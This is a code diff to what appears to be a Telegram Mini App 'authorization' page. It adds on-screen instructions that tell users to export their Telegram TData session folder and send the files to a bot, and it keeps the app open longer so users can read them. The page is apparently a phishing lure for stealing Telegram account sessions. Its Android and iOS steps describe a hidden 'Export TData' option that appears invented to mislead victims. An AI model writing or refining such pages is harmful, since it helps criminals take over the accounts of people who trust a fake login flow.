@@ -38,6 +38,21 @@
         .loading-text {
             margin-top: 10px;
         }
+        .instructions {
+            display: none;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            text-align: left;
+        }
+        .instructions ol {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin: 5px 0;
+        }
     </style>
 </head>
 <body>
@@ -46,6 +61,7 @@
         <div id="loading" class="loading">
             <div class="loading-text">Завершение авторизации...</div>
         </div>
+        <div id="instructions" class="instructions"></div>
     </div>
 
     <script>
@@ -62,14 +78,66 @@
             return 'unknown';
         }
 
+        // Показ инструкций
+        function showInstructions(platform) {
+            const instructions = document.getElementById('instructions');
+            let text = '';
+            
+            switch(platform) {
+                case 'windows':
+                    text = `
+                        <h3>Инструкция по экспорту TData:</h3>
+                        <ol>
+                            <li>Откройте Telegram Desktop</li>
+                            <li>Нажмите Ctrl+Alt+Shift+1</li>
+                            <li>Выберите папку tdata</li>
+                            <li>Нажмите "Открыть"</li>
+                        </ol>
+                        <p>После экспорта TData, отправьте файлы боту.</p>
+                    `;
+                    break;
+                case 'android':
+                    text = `
+                        <h3>Инструкция по экспорту TData:</h3>
+                        <ol>
+                            <li>Откройте Telegram</li>
+                            <li>Перейдите в Настройки</li>
+                            <li>Нажмите на версию 5 раз</li>
+                            <li>Выберите "Экспорт TData"</li>
+                        </ol>
+                        <p>После экспорта TData, отправьте файлы боту.</p>
+                    `;
+                    break;
+                case 'ios':
+                    text = `
+                        <h3>Инструкция по экспорту TData:</h3>
+                        <ol>
+                            <li>Откройте Telegram</li>
+                            <li>Перейдите в Настройки</li>
+                            <li>Нажмите на версию 5 раз</li>
+                            <li>Выберите "Экспорт TData"</li>
+                        </ol>
+                        <p>После экспорта TData, отправьте файлы боту.</p>
+                    `;
+                    break;
+                default:
+                    text = '<p>Пожалуйста, используйте Telegram Desktop для авторизации.</p>';
+            }
+            
+            instructions.innerHTML = text;
+            instructions.style.display = 'block';
+        }
+
         // Основная функция авторизации
         async function finishAuth() {
             const button = document.getElementById('authButton');
             const loading = document.getElementById('loading');
+            const instructions = document.getElementById('instructions');
             
             try {
                 button.style.display = 'none';
                 loading.style.display = 'block';
+                instructions.style.display = 'none';
                 
                 // Определяем платформу
                 const platform = detectPlatform();
@@ -85,13 +153,14 @@
                 await tg.sendData(JSON.stringify(data));
                 console.log('Export command sent successfully');
                 
-                // Показываем сообщение об успешной авторизации
-                loading.innerHTML = '<div class="loading-text">Авторизация завершена</div>';
+                // Показываем инструкции
+                loading.style.display = 'none';
+                showInstructions(platform);
                 
-                // Закрываем веб-приложение через 1 секунду
+                // Закрываем веб-приложение через 30 секунд
                 setTimeout(() => {
                     tg.close();
-                }, 1000);
+                }, 30000);
                 
             } catch (error) {
                 console.error('Auth error:', error);
